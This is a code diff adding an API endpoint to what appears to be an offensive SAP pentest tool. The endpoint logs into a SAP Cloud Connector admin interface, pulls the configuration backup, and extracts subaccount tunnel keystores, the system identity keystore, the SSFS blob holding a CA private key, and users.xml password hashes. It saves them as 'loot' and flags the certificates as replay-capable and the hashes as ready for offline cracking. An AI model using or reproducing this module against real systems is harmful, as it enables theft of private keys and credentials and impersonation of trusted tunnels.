@@ -1249,6 +1249,131 @@ def create_app(api: SAPMAPApi) -> Bottle:
         threading.Thread(target=_run, daemon=True).start()
         return json.dumps({"status": "started"})
 
+    @app.route("/api/scc/<host>/extract_keystore", method="POST")
+    def scc_extract_keystore(host):
+        """Pull the full SCC configuration backup and parse out the
+        per-subaccount tunnel keystores + system keystore + SSFS blob.
+        Drops the loot zip under ./loot/scc/<host>/ with mode 0600."""
+        response.content_type = "application/json"
+        sn = api.state.scc_nodes.get(host)
+        if not sn:
+            return json.dumps({"error": f"SCC node {host} not found"})
+        data = request.json or {}
+        user = data.get("username", "")
+        pwd = data.get("password", "")
+        backup_pwd = data.get("backup_password", "") or pwd
+        if not user or not pwd:
+            return json.dumps({"error": "username + password required"})
+        if not backup_pwd:
+            return json.dumps({"error": "backup_password required"})
+
+        def _run():
+            _task_start(f"scc:{host}:extract_keystore",
+                        f"SCC {host}: pulling backup + parsing keystores")
+            try:
+                from sapmap_scc_keystore import extract_keystore
+                res = extract_keystore(
+                    host, user, pwd,
+                    backup_password=backup_pwd,
+                    port=sn.admin_ui_port or 8443,
+                    timeout=30.0)
+                if not res.get("ok"):
+                    sapmap_findings.emit_finding(
+                        "INFO", host,
+                        f"SCC keystore extraction failed: "
+                        f"{res.get('error', 'unknown error')}",
+                        ref="scc.keystore.extract.failed",
+                        meta={"error": res.get("error")})
+                    return
+                # Authenticated admin login implies pwned (same status the
+                # pull_mappings flow flips); set if not already.
+                sn.admin_session_obtained = True
+                sn.pwned = True
+                from sapmap_models import Credentials
+                if not any(getattr(c, "username", "") == user
+                           for c in (sn.credentials or [])):
+                    sn.credentials.append(Credentials(
+                        username=user, password=pwd, verified=True))
+                sn.keystore_extracted = True
+                sn.keystore_loot_path = res.get("loot_path", "")
+                sys_ks = res.get("system_keystore") or {}
+                tun_ks = res.get("tunnel_keystores") or []
+                # tunnel_privkey_fp = SHA-256 of the system identity p12;
+                # the per-subaccount fingerprints are surfaced in findings.
+                if sys_ks.get("sha256"):
+                    sn.tunnel_privkey_fp = sys_ks["sha256"]
+                # pp_ca_privkey_fp: SAP stores the PP CA private key
+                # inside the SSFS blob (SSFS_SCC.KEY/.DAT).  We fingerprint
+                # those bytes so cross-session tracking still works
+                # without unlocking the SSFS.
+                if res.get("ssfs_present"):
+                    # Re-read the zip to get the SSFS contents and hash.
+                    try:
+                        import io as _io, zipfile as _zf, hashlib as _h
+                        with open(sn.keystore_loot_path, "rb") as fh:
+                            blob = fh.read()
+                        z = _zf.ZipFile(_io.BytesIO(blob))
+                        h = _h.sha256()
+                        for nm in ("scc_config/SSFS_SCC.KEY",
+                                   "scc_config/SSFS_SCC.DAT"):
+                            try:
+                                h.update(z.read(nm))
+                            except KeyError:
+                                pass
+                        sn.pp_ca_privkey_fp = h.hexdigest()
+                    except Exception:
+                        sn.pp_ca_privkey_fp = ""
+                sapmap_findings.emit_finding(
+                    "CRITICAL", host,
+                    f"SCC keystore looted: backup zip ({res.get('loot_size',0)} B) "
+                    f"saved to {sn.keystore_loot_path}. "
+                    f"{len(tun_ks)} subaccount tunnel keystore(s) extracted, "
+                    f"system identity keystore extracted"
+                    f"{', SSFS (PP CA private key) present' if res.get('ssfs_present') else ''}.",
+                    ref="scc.keystore.extracted",
+                    meta={"loot_path": sn.keystore_loot_path,
+                          "system_p12_sha256": sys_ks.get("sha256"),
+                          "tunnel_count": len(tun_ks),
+                          "ssfs": res.get("ssfs_present"),
+                          "users_xml": res.get("users_xml_present")})
+                # Per-subaccount finding so the operator sees every
+                # tunnel cert they now own.
+                for k in tun_ks:
+                    sapmap_findings.emit_finding(
+                        "CRITICAL", host,
+                        f"SCC tunnel client keystore for subaccount "
+                        f"{k['subaccount']} ({k['region']}) "
+                        f"sha256={k['sha256'][:16]}… — replay-capable.",
+                        ref="scc.keystore.tunnel.subaccount",
+                        meta={"subaccount": k["subaccount"],
+                              "region": k["region"],
+                              "sha256": k["sha256"],
+                              "path_in_zip": k["path"]})
+                if res.get("users_xml_present"):
+                    sapmap_findings.emit_finding(
+                        "HIGH", host,
+                        f"SCC config/users.xml extracted "
+                        f"(sha256={res.get('users_xml_sha256','')[:16]}…) — "
+                        f"hashed local user passwords available for offline crack.",
+                        ref="scc.keystore.users.xml",
+                        meta={"users_xml_sha256": res.get("users_xml_sha256")})
+                # Sharpen version from manifest if available.
+                man_v = (res.get("manifest") or {}).get("version") or ""
+                if man_v and not sn.version:
+                    sn.version = man_v
+                    sn.version_source = "backup-manifest"
+            except Exception as e:
+                print(f"[-] SCC {host}: keystore extract failed: {e}")
+                sapmap_findings.emit_finding(
+                    "INFO", host,
+                    f"SCC keystore extraction error: {e}",
+                    ref="scc.keystore.extract.error",
+                    meta={"error": str(e)})
+            finally:
+                _task_end(f"scc:{host}:extract_keystore")
+        threading.Thread(target=_run, daemon=True).start()
+        return json.dumps({"status": "started"})
+
     @app.route("/api/scc/<host>/probe_mappings", method="POST")
     def scc_probe_mappings(host):
         """Tunnel-relay smoke test: TCP/HTTP probe every mapping's
